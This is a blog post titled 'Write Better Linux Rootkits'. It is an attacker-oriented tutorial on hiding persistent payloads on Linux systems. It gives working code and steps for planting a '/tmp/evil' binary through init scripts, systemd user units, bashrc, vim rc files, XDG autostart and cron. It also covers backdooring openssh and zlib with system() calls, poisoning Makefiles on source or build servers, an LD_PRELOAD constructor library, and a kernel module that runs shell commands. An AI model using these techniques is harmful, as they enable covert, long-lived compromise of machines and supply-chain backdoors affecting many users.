<!DOCTYPE html>
<html lang="en"  prefix="og: http://ogp.me/ns# fb: https://www.facebook.com/2008/fbml" >

<head>
    <title>Write Better Linux Rootkits - jm33_ng</title>
    <!-- Using the latest rendering mode for IE -->
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">


    <link href="https://jm33.me/img/icon.png" rel="icon">

<link rel="canonical" href="https://jm33.me/write-better-linux-rootkits.html">

<meta name="author" content="jm33" />
<meta name="keywords" content="linux,rootkit,lkm" />
<meta name="description" content="有个中文版在Freebuf，需要的可以去看看 dig deeper into user space lets abuse inits the INIT a lot of script kiddies know how to write their own SysV service file or modify the existing ones, fortunate for them, SysVinit is still …" />

<meta property="og:site_name" content="jm33_ng" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Write Better Linux Rootkits" />
<meta property="og:url" content="https://jm33.me/write-better-linux-rootkits.html" />
<meta property="og:description" content="有个中文版在Freebuf，需要的可以去看看 dig deeper into user space lets abuse inits the INIT a lot of script kiddies know how to write their own SysV service file or modify the existing ones, fortunate for them, SysVinit is still …" />
<meta property="article:published_time" content="2018-11-01" />
<meta property="article:section" content="Pentest" />
<meta property="article:tag" content="linux" />
<meta property="article:tag" content="rootkit" />
<meta property="article:tag" content="lkm" />
<meta property="article:author" content="jm33" />



    <!-- Bootstrap -->
    <link rel="stylesheet" href="https://jm33.me/theme/css/bootstrap.sandstone.min.css" type="text/css" />
    <link href="https://jm33.me/theme/css/font-awesome.min.css" rel="stylesheet">

    <link href="https://jm33.me/theme/css/pygments/native.css" rel="stylesheet">
    <link rel="stylesheet" href="https://jm33.me/theme/css/style.css" type="text/css" />



    <!-- FontAwesome -->
    <!--  -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

    <!-- Noto Sans SC font -->
    <!--  -->
    <link href="https://fonts.googleapis.com/css?family=Noto+Sans+SC&display=swap" rel="stylesheet">
    <!-- Source Code Pro -->
    <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro&display=swap" rel="stylesheet">

    <!-- asciinema css -->
    <link rel="stylesheet" type="text/css" href="https://jm33.me/theme/css/asciinema-player.css" />

</head>

<body>

    <div class="navbar navbar-default navbar-fixed-top" role="navigation">
        <div class="container">
            <div class="navbar-header">
                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
                    <span class="sr-only">Toggle navigation</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
                <a href="https://jm33.me/" class="navbar-brand">
jm33_ng                </a>
            </div>
            <div class="collapse navbar-collapse navbar-ex1-collapse">
                <ul class="nav navbar-nav">
                        <li >
                            <a href="https://jm33.me/category/course-notes.html">Course notes</a>
                        </li>
                        <li >
                            <a href="https://jm33.me/category/misc.html">Misc</a>
                        </li>
                        <li class="active" >
                            <a href="https://jm33.me/category/pentest.html">Pentest</a>
                        </li>
                        <li >
                            <a href="https://jm33.me/category/programming.html">Programming</a>
                        </li>
                        <li >
                            <a href="https://jm33.me/category/tools.html">Tools</a>
                        </li>
                        <li >
                            <a href="https://jm33.me/category/vulnerabilities.html">Vulnerabilities</a>
                        </li>
                </ul>
                <ul class="nav navbar-nav navbar-right">
                </ul>
            </div>
            <!-- /.navbar-collapse -->
        </div>
    </div> <!-- /.navbar -->

    <!-- Banner -->
<style>
    #banner {
        background-image:url("https://jm33.me/img/banner.webp");
    }
</style>

<div id="banner">
    <div class="container">
        <div class="copy" style="border-radius: 4px">
            <h1>jm33_ng</h1>
            <br>
            <p class="intro"><s>cyber security</s> / noob <s>developer</s> / poor English</p>
        </div>
    </div>
</div>    <!-- End Banner -->

    <!-- Content Container -->
    <div class="container">
        <div class="row">
            <div class="col-sm-9">
<section id="content">
    <article>
        <header class="page-header">
            <h1>
                <a href="https://jm33.me/write-better-linux-rootkits.html" rel="bookmark" title="Permalink to Write Better Linux Rootkits">
                    Write Better Linux Rootkits
                </a>
            </h1>
        </header>
        <div class="entry-content">
            <div class="panel">
                <div class="panel-body">
<footer class="post-info">
    <span class="label label-default">Date</span>
    <span class="published">
        <i class="fa fa-calendar"></i><time datetime="2018-11-01T00:00:00+08:00"> Thu 01 November 2018</time>
    </span>





<span class="label label-default">Tags</span>
	<a href="https://jm33.me/tag/linux.html">linux</a>
        /
	<a href="https://jm33.me/tag/rootkit.html">rootkit</a>
        /
	<a href="https://jm33.me/tag/lkm.html">lkm</a>
    
</footer><!-- /.post-info -->                </div>
            </div>
            <nav class="toc">
                <h3>Table of Contents</h3>
                <div class="toc">
<ul>
<li><a href="#dig-deeper-into-user-space">dig deeper into user space</a><ul>
<li><a href="#lets-abuse-inits">lets abuse inits</a><ul>
<li><a href="#the-init">the INIT</a></li>
<li><a href="#bashrc">bashrc</a></li>
<li><a href="#xinitrc">xinitrc</a></li>
<li><a href="#other-rcs">other RCs</a></li>
</ul>
</li>
<li><a href="#abuse-guide">abuse GUI/DE</a><ul>
<li><a href="#xdg-autostart-for-system">XDG autostart for system</a></li>
<li><a href="#xdg-autostart-for-user">XDG autostart for user</a></li>
</ul>
</li>
<li><a href="#our-favorite-crond">our favorite -- crond</a></li>
<li><a href="#replacing-files">replacing files</a></li>
<li><a href="#abuse-dynamic-libs">abuse dynamic libs</a><ul>
<li><a href="#replace-it">replace it</a></li>
<li><a href="#ldsopreload">ld.so.preload</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#make-use-of-kernel-space">make use of kernel space</a><ul>
<li><a href="#lkm">LKM</a></li>
<li><a href="#no-one-seems-to-care-about-initrd">no one seems to care about initrd</a></li>
</ul>
</li>
<li><a href="#thats-it-thank-you-guys-for-being-here-if-you-need-heres-the-chinese-version">thats it, thank you guys for being here. if you need, heres the Chinese version</a></li>
</ul>
</div>
            </nav>
            <hr><br>
            
<p><a href="https://www.freebuf.com/column/188100.html">有个中文版在Freebuf，需要的可以去看看</a></p>
<p><img alt="linux rootkit" src="/img/rootkit-linux.jpg"/></p>
<h2 id="dig-deeper-into-user-space">dig deeper into user space</h2>
<h3 id="lets-abuse-inits">lets abuse inits</h3>
<h4 id="the-init">the INIT</h4>
<p>a lot of script kiddies know how to write their own SysV service file or modify the existing ones, fortunate for them, SysVinit is still widely supported in Linux world. Debian family choose to keep their SysVinit compatability, which is also why <a href="https://packages.debian.org/search?keywords=systemd-sysv">systemd-sysv</a> exists, thus, Ubuntu inherited this shit too.</p>
<p>for Ubuntu, things can be quite complicated, it historically used <a href="http://upstart.ubuntu.com">upstart</a>, <a href="https://wiki.ubuntu.com/SystemdForUpstartUsers">switched to systemd</a> from 15.04, then dropped upstart and became more like Debian.</p>
<p>heres a screenshot for INIT on Ubuntu 18.04:</p>
<p><img alt="1804 init" src="/img/1804init.png"/></p>
<p>almost forgot the rootkit part...</p>
<p>yea, for most of the cases, we use SysV style service file, which, is basically shell scripts, you can find them in many devices, include IoT ones:</p>
<div class="highlight"><pre><span></span><code><span class="ch">#!/bin/sh</span>

<span class="c1"># all comments have been removed</span>

<span class="nv">PATH</span><span class="o">=</span>/bin:/usr/bin:/sbin:/usr/sbin
<span class="nv">DESC</span><span class="o">=</span><span class="s2">"cron daemon"</span>
<span class="nv">NAME</span><span class="o">=</span>cron
<span class="nv">DAEMON</span><span class="o">=</span>/usr/sbin/cron
<span class="nv">PIDFILE</span><span class="o">=</span>/var/run/crond.pid
<span class="nv">SCRIPTNAME</span><span class="o">=</span>/etc/init.d/<span class="s2">"</span><span class="nv">$NAME</span><span class="s2">"</span>

<span class="nb">test</span><span class="w"> </span>-f<span class="w"> </span><span class="nv">$DAEMON</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nb">exit</span><span class="w"> </span><span class="m">0</span>

.<span class="w"> </span>/lib/lsb/init-functions<span class="w"> </span><span class="c1"># wow, why not put our evil functions in this?</span>

<span class="o">[</span><span class="w"> </span>-r<span class="w"> </span>/etc/default/cron<span class="w"> </span><span class="o">]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>.<span class="w"> </span>/etc/default/cron

parse_environment<span class="o">()</span><span class="w"> </span><span class="o">{</span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span>ENV_FILE<span class="w"> </span><span class="k">in</span><span class="w"> </span>/etc/environment<span class="w"> </span>/etc/default/locale<span class="p">;</span><span class="w"> </span><span class="k">do</span>
<span class="w">        </span><span class="o">[</span><span class="w"> </span>-r<span class="w"> </span><span class="s2">"</span><span class="nv">$ENV_FILE</span><span class="s2">"</span><span class="w"> </span><span class="o">]</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="k">continue</span>
<span class="w">        </span><span class="o">[</span><span class="w"> </span>-s<span class="w"> </span><span class="s2">"</span><span class="nv">$ENV_FILE</span><span class="s2">"</span><span class="w"> </span><span class="o">]</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="k">continue</span>

<span class="w">        </span><span class="k">for</span><span class="w"> </span>var<span class="w"> </span><span class="k">in</span><span class="w"> </span>LANG<span class="w"> </span>LANGUAGE<span class="w"> </span>LC_ALL<span class="w"> </span>LC_CTYPE<span class="p">;</span><span class="w"> </span><span class="k">do</span>
<span class="w">            </span><span class="nv">value</span><span class="o">=</span><span class="k">$(</span>egrep<span class="w"> </span><span class="s2">"^</span><span class="si">${</span><span class="nv">var</span><span class="si">}</span><span class="s2">="</span><span class="w"> </span><span class="s2">"</span><span class="nv">$ENV_FILE</span><span class="s2">"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tail<span class="w"> </span>-n1<span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d<span class="o">=</span><span class="w"> </span>-f2<span class="k">)</span>
<span class="w">            </span><span class="o">[</span><span class="w"> </span>-n<span class="w"> </span><span class="s2">"</span><span class="nv">$value</span><span class="s2">"</span><span class="w"> </span><span class="o">]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">eval</span><span class="w"> </span><span class="nb">export</span><span class="w"> </span><span class="nv">$var</span><span class="o">=</span><span class="nv">$value</span>

<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span>-n<span class="w"> </span><span class="s2">"</span><span class="nv">$value</span><span class="s2">"</span><span class="w"> </span><span class="o">]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="s2">"</span><span class="nv">$ENV_FILE</span><span class="s2">"</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>/etc/environment<span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
<span class="w">                </span>log_warning_msg<span class="w"> </span><span class="s2">"/etc/environment has been deprecated for locale information; use /etc/default/locale for </span><span class="nv">$var</span><span class="s2">=</span><span class="nv">$value</span><span class="s2"> instead"</span>
<span class="w">            </span><span class="k">fi</span>
<span class="w">        </span><span class="k">done</span>
<span class="w">    </span><span class="k">done</span>

<span class="w">    </span><span class="c1"># Get the timezone set.</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span>-z<span class="w"> </span><span class="s2">"</span><span class="nv">$TZ</span><span class="s2">"</span><span class="w"> </span>-a<span class="w"> </span>-e<span class="w"> </span>/etc/timezone<span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
<span class="w">        </span><span class="nv">TZ</span><span class="o">=</span><span class="k">$(</span>cat<span class="w"> </span>/etc/timezone<span class="k">)</span>
<span class="w">    </span><span class="k">fi</span>
<span class="o">}</span>

<span class="c1"># Parse the system's environment</span>
<span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="s2">"</span><span class="nv">$READ_ENV</span><span class="s2">"</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"yes"</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
<span class="w">    </span>parse_environment
<span class="k">fi</span>

<span class="k">case</span><span class="w"> </span><span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span><span class="w"> </span><span class="k">in</span>
start<span class="o">)</span>
<span class="w">    </span>log_daemon_msg<span class="w"> </span><span class="s2">"Starting periodic command scheduler"</span><span class="w"> </span><span class="s2">"cron"</span><span class="w"> </span><span class="c1"># we can modify this function, without bringing too much attention</span>
<span class="w">    </span>start_daemon<span class="w"> </span>-p<span class="w"> </span><span class="nv">$PIDFILE</span><span class="w"> </span><span class="nv">$DAEMON</span><span class="w"> </span><span class="nv">$EXTRA_OPTS</span>
<span class="w">    </span>log_end_msg<span class="w"> </span><span class="nv">$?</span>
<span class="w">    </span><span class="p">;;</span>
stop<span class="o">)</span>
<span class="w">    </span>log_daemon_msg<span class="w"> </span><span class="s2">"Stopping periodic command scheduler"</span><span class="w"> </span><span class="s2">"cron"</span>
<span class="w">    </span>killproc<span class="w"> </span>-p<span class="w"> </span><span class="nv">$PIDFILE</span><span class="w"> </span><span class="nv">$DAEMON</span>
<span class="w">    </span><span class="nv">RETVAL</span><span class="o">=</span><span class="nv">$?</span>
<span class="w">    </span><span class="o">[</span><span class="w"> </span><span class="nv">$RETVAL</span><span class="w"> </span>-eq<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="o">]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">[</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">"</span><span class="nv">$PIDFILE</span><span class="s2">"</span><span class="w"> </span><span class="o">]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>rm<span class="w"> </span>-f<span class="w"> </span><span class="nv">$PIDFILE</span>
<span class="w">    </span>log_end_msg<span class="w"> </span><span class="nv">$RETVAL</span>
<span class="w">    </span><span class="p">;;</span>
restart<span class="o">)</span>
<span class="w">    </span>log_daemon_msg<span class="w"> </span><span class="s2">"Restarting periodic command scheduler"</span><span class="w"> </span><span class="s2">"cron"</span>
<span class="w">    </span><span class="nv">$0</span><span class="w"> </span>stop
<span class="w">    </span><span class="nv">$0</span><span class="w"> </span>start
<span class="w">    </span><span class="p">;;</span>
reload<span class="w"> </span><span class="p">|</span><span class="w"> </span>force-reload<span class="o">)</span>
<span class="w">    </span>log_daemon_msg<span class="w"> </span><span class="s2">"Reloading configuration files for periodic command scheduler"</span><span class="w"> </span><span class="s2">"cron"</span>
<span class="w">    </span><span class="c1"># cron reloads automatically</span>
<span class="w">    </span>log_end_msg<span class="w"> </span><span class="m">0</span>
<span class="w">    </span><span class="p">;;</span>
status<span class="o">)</span>
<span class="w">    </span>status_of_proc<span class="w"> </span>-p<span class="w"> </span><span class="nv">$PIDFILE</span><span class="w"> </span><span class="nv">$DAEMON</span><span class="w"> </span><span class="nv">$NAME</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">exit</span><span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nb">exit</span><span class="w"> </span><span class="nv">$?</span>
<span class="w">    </span><span class="p">;;</span>
*<span class="o">)</span>
<span class="w">    </span>log_action_msg<span class="w"> </span><span class="s2">"Usage: /etc/init.d/cron {start|stop|status|restart|reload|force-reload}"</span>
<span class="w">    </span><span class="nb">exit</span><span class="w"> </span><span class="m">2</span>
<span class="w">    </span><span class="p">;;</span>
<span class="k">esac</span>
<span class="nb">exit</span><span class="w"> </span><span class="m">0</span>
</code></pre></div>
<p>if we were going to inplement our lovely rootkit in this service, please read the above code carefully</p>
<p>an example here:</p>
<p><img alt="sysv init" src="/img/sysv_evil.png"/></p>
<p>put it to:</p>
<div class="highlight"><pre><span></span><code>/etc/init.d
/etc/rc[runlevel].d
/etc/rc.local
</code></pre></div>
<p>you will need root for this</p>
<p>for systemd, we can do this without root, thats where <a href="https://wiki.archlinux.org/index.php/Systemd/User">systemd/User</a> comes in</p>
<p>possible service file locations:</p>
<div class="highlight"><pre><span></span><code>/etc/systemd/system
/etc/systemd/user
/lib/systemd/system
/lib/systemd/user
~/.local/share/systemd/user
~/.config/systemd/user
</code></pre></div>
<p>write service file like this:</p>
<div class="highlight"><pre><span></span><code><span class="k">[Unit]</span>
<span class="na">Description</span><span class="o">=</span><span class="s">Music Player Daemon</span>

<span class="k">[Service]</span>
<span class="na">ExecStart</span><span class="o">=</span><span class="s">/tmp/evil hello_from_systemd_user</span>

<span class="k">[Install]</span>
<span class="na">WantedBy</span><span class="o">=</span><span class="s">default.target</span>
</code></pre></div>
<p>use <code>systemctl --user enable service</code> for user services, <code>systemctl enable service</code> is for system-wide service</p>
<h4 id="bashrc">bashrc</h4>
<p>very handy as well!</p>
<p>bash shell is frequently executed, which means bashrc files are, too</p>
<p>there are some files you might love:</p>
<div class="highlight"><pre><span></span><code>/etc/profile
~/.bashrc
~/.bash_profile
~/.bash_logout
</code></pre></div>
<p>just add something like</p>
<div class="highlight"><pre><span></span><code>/tmp/evil<span class="w"> </span>hello_from_bashrc
</code></pre></div>
<p>thats it</p>
<h4 id="xinitrc">xinitrc</h4>
<p>you probably wont believe this, but quite a lot linux servers have Xorg installed (coz they want GUI), the most used distro for those admins, is CentOS6 with Gnome2</p>
<h4 id="other-rcs">other RCs</h4>
<p>many programs have their own RC file for init config purposes, such as VIM</p>
<p>they exec code in RCs, and the RCs can be placed under <code>~</code>, lets abuse VIM:</p>
<p><img alt="vim evil" src="/img/vim_evil.png"/></p>
<h3 id="abuse-guide">abuse GUI/DE</h3>
<p>most linux servers dont have any GUI installed, thus dont need to worry about this part. but like i said, there are plenty of boxes have Gnome (mostly CentOS/RHEL), i guess knowing a little bit about linux desktop can help you make better use of these</p>
<h4 id="xdg-autostart-for-system">XDG autostart for system</h4>
<p>put a desktop file to <code>/etc/xdg/autostart</code> and it will be executed on DE boot:</p>
<p><img alt="desktop evil" src="/img/desktop_evil.png"/></p>
<h4 id="xdg-autostart-for-user">XDG autostart for user</h4>
<p>likewise, put the above file to <code>~/.config/autostart</code> and it will be executed on user login</p>
<h3 id="our-favorite-crond">our favorite -- crond</h3>
<p>its indeed script kids' favorite, coz its as straight forward as Windows's schedule task. however its also well known to sys admins :(</p>
<p>so, lets put our job to some hidden places like <code>/etc/cron.d</code> insead of <code>/var/spool/cron</code></p>
<p>im sure everybody knows how to write a cron job:</p>
<p><img alt="cron evil" src="/img/cron_evil.png"/></p>
<h3 id="replacing-files">replacing files</h3>
<p>it can be done in many ways, here im going to show you some source code tampering trick</p>
<p>take openssh as an example, we can download its source and modify some function</p>
<p><code>uncompress_buffer()</code> will only be used when <code>ssh -C</code> is specified, emmm, so be it, it is the one</p>
<p><img alt="sshd evil" src="/img/sshd_evil.png"/></p>
<p>when needed, use <code>ssh -C target</code> and the target will run our evil function</p>
<p><img alt="sshd evil run" src="/img/sshd_evil_run.png"/></p>
<p>we can patch existing binaries with our shellcode, without having to recompile the whole project. theres a tool called <a href="https://github.com/secretsquirrel/the-backdoor-factory">backdoor-factory</a> can help you with that</p>
<p>plus, if we are in a git/svn server, make use of the source code it hosts, modify its <code>Makefile</code> or <code>configure</code> or something else useful. through which, you have a chance running your code in a mass scale of targets, or worst, just run it on the git/svn build server</p>
<h3 id="abuse-dynamic-libs">abuse dynamic libs</h3>
<p>the use dynamic libs is very common, simply put, libs contain all the functions an executable calls, which means we can add our own code and get executed too</p>
<h4 id="replace-it">replace it</h4>
<p>most of the cases, we dont patch existing SOs (shared object), to add our code, we need to recompile the lib</p>
<p>to find a lib to tamper with, we use <code>ldd</code> to reveal its links to every dynamic lib:</p>
<p><img alt="ldd" src="/img/ldd.png"/></p>
<p>here, we play with <code>libz.so.1</code>, coz its a lot like the example in previous part</p>
<p><code>libz.so.1</code> comes from <a href="https://github.com/madler/zlib">zlib</a>, you can check it with your package manager:</p>
<p><img alt="zlib" src="/img/zlib.png"/></p>
<p>download openssh portable 7.9 source, grep search <code>zlib</code> keyword, we can easily find some code resides in <code>packet.c</code>:</p>
<p><img alt="zlib in ssh" src="/img/zlib_ssh.png"/></p>
<p>now we change zlib's code, add <code>system()</code> to <code>inflate()</code> function (which is located in <code>inflate.c</code>):</p>
<p><img alt="zlib evil" src="/img/zlib_evil.png"/></p>
<p>build zlib and use the modified <code>libz.so*</code> to replace the legit ones in target system, and run <code>ssh -C</code> to trigger our code:</p>
<p><img alt="zlib evil run" src="/img/zlib_evil_run.png"/></p>
<p><strong>NOTE</strong> as dynamic libs, their functions get called frequently by ELFs, we better not add overhead to our code. and BEWARE, what if some external ELF we call in our lib code calls back? that would be a disaster</p>
<h4 id="ldsopreload">ld.so.preload</h4>
<p>thats what script kids use, yes, according to <code>ld.so</code>'s manual, <code>ld.so</code> handles every ELF/a.out in Linux,</p>
<blockquote>
<p>The program ld.so handles a.out binaries, a format used long ago;
ld-linux.so* (/lib/ld-linux.so.1 for libc5, /lib/ld-linux.so.2 for glibc2) handles ELF,
which everybody has been using for years now.
Otherwise, both have the same behavior, and use the same support files and programs as ldd(1), ldconfig(8),
and /etc/ld.so.conf.</p>
</blockquote>
<p>except for statically linked ELFs, which has their own <code>ld.a</code> bundled with everything else</p>
<p>to load a lib before <code>ld.so</code> handles any ELFs, we put our lib into <code>/etc/ld.so.preload</code>, or set <code>LD_PRELOAD=/path/to/libwhatever.so</code>, the latter, is more stealth</p>
<p>our lib is named <code>libevil.so</code></p>
<p>as a lib, it cant just get executed, it needs to be called. but what fucking ELF would call our <code>libevil</code>??? no worries, we can use something like <code>DllMain</code>, its provided by GCC:</p>
<p><img alt="gcc attributes" src="/img/attr.png"/></p>
<p>here comes our code:</p>
<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>

<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">))</span>
<span class="n">lib_init</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>

<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">lib_init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">pid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fork</span><span class="p">();</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">pid</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">execl</span><span class="p">(</span><span class="s">"/tmp/evil"</span><span class="p">,</span><span class="w"> </span><span class="s">"/tmp/evil"</span><span class="p">,</span><span class="w"> </span><span class="s">"hello_from_evil</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="nb">NULL</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="s">"evil lib initialized"</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>
<p>and the <code>Makefile</code>:</p>
<div class="highlight"><pre><span></span><code><span class="nf">all</span><span class="o">:</span>
<span class="w">        </span>gcc<span class="w"> </span>-Wall<span class="w"> </span>-fPIC<span class="w"> </span>-shared<span class="w"> </span>-o<span class="w"> </span>libevil.so<span class="w"> </span>evil.c<span class="w"> </span>-ldl

<span class="nf">clean</span><span class="o">:</span>
<span class="w">        </span>rm<span class="w"> </span>-f<span class="w"> </span>libevil.so<span class="w"> </span>*main*
</code></pre></div>
<p>make it and upload to target, test it out:</p>
<p><img alt="libevil run" src="/img/libevil_run.png"/></p>
<p><strong>NOTE</strong> <code>libevil.so</code> gets run before any ELFs, therefore we cant call anything dynamic, to prevent boom. also, <code>execl()</code> doesnt return unless it gets an error, which means <code>libevil.so</code> will exit its current process before any ELF acutally gets run, resulting in an unusable system</p>
<p>btw, <code>system()</code> always call <code>/bin/sh</code>, thus cant be used in our <code>libevil.so</code></p>
<p>so, why not write our rootkit entirely in libs?</p>
<h2 id="make-use-of-kernel-space">make use of kernel space</h2>
<h3 id="lkm">LKM</h3>
<p>linux can load unverified kernel modules on the fly, sounds cool huh?</p>
<p>writing LKMs is easier than it looks, just write a <code>Makefile</code> first, you will know when you see it:</p>
<div class="highlight"><pre><span></span><code><span class="nv">obj-m</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span>temp.o

<span class="nf">all</span><span class="o">:</span>
<span class="w">        </span>make<span class="w"> </span>-C<span class="w"> </span>/lib/modules/<span class="k">$(</span>shell<span class="w"> </span>uname<span class="w"> </span>-r<span class="k">)</span>/build/<span class="w"> </span><span class="nv">M</span><span class="o">=</span><span class="k">$(</span>PWD<span class="k">)</span><span class="w"> </span>modules

<span class="nf">clean</span><span class="o">:</span>
<span class="w">        </span>make<span class="w"> </span>-C<span class="w"> </span>/lib/modules/<span class="k">$(</span>shell<span class="w"> </span>uname<span class="w"> </span>-r<span class="k">)</span>/build/<span class="w"> </span><span class="nv">M</span><span class="o">=</span><span class="k">$(</span>PWD<span class="k">)</span><span class="w"> </span>clean
</code></pre></div>
<p>and the LKM code comes in:</p>
<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;linux/kernel.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;linux/kmod.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;linux/module.h&gt;</span>

<span class="n">MODULE_LICENSE</span><span class="p">(</span><span class="s">"GPL"</span><span class="p">);</span><span class="w"> </span><span class="c1">// if not specified, the kernel is gonna complain</span>

<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">cmd</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">argv</span><span class="p">[],</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">envp</span><span class="p">[])</span>
<span class="cm">/* execute shell commands */</span>
<span class="p">{</span>
<span class="w">    </span><span class="n">call_usermodehelper</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="w"> </span><span class="n">argv</span><span class="p">,</span><span class="w"> </span><span class="n">envp</span><span class="p">,</span><span class="w"> </span><span class="n">UMH_WAIT_EXEC</span><span class="p">);</span><span class="w"> </span><span class="c1">// this is how we execute something</span>
<span class="w">    </span><span class="c1">// envp is useful as it provides env var support</span>
<span class="w">    </span><span class="n">printk</span><span class="p">(</span><span class="s">"exec cmd %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">argv</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">init_mod</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="cm">/*module setup*/</span>
<span class="p">{</span>
<span class="w">    </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">shell</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="s">"/tmp/evil"</span><span class="p">,</span><span class="w"> </span><span class="s">"hello_from_lkm"</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="w"> </span><span class="p">};</span>
<span class="w">    </span><span class="n">cmd</span><span class="p">(</span><span class="n">shell</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
<span class="w">    </span><span class="n">printk</span><span class="p">(</span><span class="s">"initialized module</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">cleanup_mod</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="cm">/*module shutdown*/</span>
<span class="p">{</span>
<span class="w">    </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">shell</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="s">"/bin/rm"</span><span class="p">,</span><span class="w"> </span><span class="s">"/tmp/evil.log"</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="w"> </span><span class="p">};</span>
<span class="w">    </span><span class="n">cmd</span><span class="p">(</span><span class="n">shell</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
<span class="w">    </span><span class="n">printk</span><span class="p">(</span><span class="s">"module removed</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="p">;</span>
<span class="p">}</span>

<span class="cm">/* specify init and exit method */</span>
<span class="n">module_init</span><span class="p">(</span><span class="n">init_mod</span><span class="p">);</span>
<span class="n">module_exit</span><span class="p">(</span><span class="n">cleanup_mod</span><span class="p">);</span>
</code></pre></div>
<p>simply put, you need <code>module_init()</code> and <code>module_exit()</code>, with your custom <code>int init(void)</code> abd <code>void exit(void)</code> as args</p>
<p>add a <a href="https://www.gnu.org/licenses/gpl-3.0.en.html">GPL</a> lisence, hail <a href="https://www.fsf.org/">FSF</a>!</p>
